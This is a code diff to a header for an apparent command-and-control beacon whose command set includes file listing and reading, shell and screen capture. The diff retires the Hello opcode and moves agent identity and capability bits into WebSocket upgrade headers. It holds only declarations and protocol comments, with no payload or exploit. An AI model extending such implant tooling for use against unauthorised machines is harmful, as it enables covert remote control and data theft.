@@ -4,10 +4,12 @@
 #include "shell.h"
 #include "screen_capture.h"
 
-// Enum to represent the different command types that can be handled by the agent
+// Enum to represent the different command types that can be handled by the agent.
+// Opcode 0x00 is retired (was Hello in API <= 5 — identity now travels on the
+// WebSocket upgrade's HTTP headers, see main.cc BuildIdentityHeaders); the hole
+// is left so remaining opcodes keep their wire values.
 enum CommandType : UINT8
 {
-    Command_Hello = 0,
     Command_GetDirectoryContent = 1,
     Command_GetFileContent = 2,
     Command_GetFileChunkHash = 3,
@@ -27,11 +29,11 @@ enum CommandType : UINT8
 // Each FEATURE CATEGORY has a SUPPORT_<CATEGORY> macro (default 1). Override to
 // 0 per-platform/build (e.g. via a toolchain compile definition) to compile a
 // whole category out: every command it owns is then unregistered in the
-// dispatch table (main.cc) and its bit is cleared in the Hello capability mask.
-// These macros are the single source of truth for which feature categories this
-// beacon supports — the dispatch wiring and BuildCapabilityMask() both derive
-// from them. Hello and Exit are mandatory core commands and are always
-// registered; they are not feature-gated and not advertised in the mask.
+// dispatch table (main.cc) and its bit is cleared in the identity capability
+// mask header. These macros are the single source of truth for which feature
+// categories this beacon supports — the dispatch wiring and BuildCapabilityMask()
+// both derive from them. Exit is a mandatory core command and is always
+// registered; it is not feature-gated and not advertised in the mask.
 //
 // Category -> owned commands:
 //   FILESYSTEM  GetDirectoryContent, GetFileContent, GetFileChunkHash
@@ -55,33 +57,22 @@ enum CommandType : UINT8
 #define AGENT_COMMIT_HASH "00000000"
 #endif
 #ifndef AGENT_API_VERSION
-#define AGENT_API_VERSION 5
+#define AGENT_API_VERSION 1
 #endif
 #ifndef AGENT_NAME_ID
 #define AGENT_NAME_ID 0
 #endif
 
-// Build metadata header prepended to the Hello response (right after the
-// status code). ApiVersion and AgentNameId lead the packet so the C2 can
-// identify the agent and determine the expected packet structure before
-// parsing the variable rest of the response.
-#pragma pack(push, 1)
-struct AgentBuildInfo
-{
-    UINT32 ApiVersion;  ///< Agent API version (bumped on breaking protocol changes)
-    UINT32 AgentNameId; ///< Agent implementation identifier (AGENT_NAME_ID)
-    CHAR CommitHash[9]; ///< 8 hex chars + null
-    UINT32 BuildNumber;
-    BOOL Is64Bit; ///< true iff this agent binary is 64-bit (sizeof(void*) == 8)
-};
-#pragma pack(pop)
+// NOTE: build metadata (ApiVersion, AgentNameId, CommitHash, BuildNumber,
+// Is64Bit) is no longer a wire struct — it travels on the WebSocket upgrade
+// request as X-Agent-* HTTP headers, built in main.cc (BuildIdentityHeaders).
 
 /**
- * @brief Feature categories advertised in the Hello capability mask.
+ * @brief Feature categories advertised in the identity capability mask header.
  *
  * @details Each category's bit position in CapabilityMask equals its value
- *          here. Hello and Exit are mandatory core commands and are
- *          intentionally NOT represented (always available, never gated).
+ *          here. Exit is a mandatory core command and is intentionally NOT
+ *          represented (always available, never gated).
  */
 enum CapabilityBit : UINT8
 {
@@ -92,7 +83,8 @@ enum CapabilityBit : UINT8
 };
 
 /**
- * @brief 64-bit feature-category capability mask appended to the Hello response.
+ * @brief 64-bit feature-category capability mask (sent as the X-Agent-Capabilities
+ *        hex header on the WebSocket upgrade).
  *
  * @details Bit i (byte i/8, bit i%8, LSB-first) is set iff feature category i
  *          is supported. Bits [CapabilityBitCount .. 63] are reserved (0).
@@ -116,7 +108,8 @@ static_assert(sizeof(CapabilityMask) == 8, "CapabilityMask must stay 8 bytes on 
  * @details Each category bit mirrors its SUPPORT_<CATEGORY> macro; the bit
  *          position equals the CapabilityBit value.
  *
- * @return Compile-time-constant CapabilityMask to append to the Hello response.
+ * @return Compile-time-constant CapabilityMask serialized into the
+ *         X-Agent-Capabilities header (lowercase hex).
  */
 inline constexpr CapabilityMask BuildCapabilityMask() noexcept
 {
@@ -167,7 +160,6 @@ struct Context
 using CommandHandler = VOID (*)(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context);
 
 // Command handler function declarations
-VOID Handle_HelloCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context);
 VOID Handle_GetDirectoryContentCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context);
 VOID Handle_GetFileContentCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context);
 VOID Handle_GetFileChunkHashCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context);
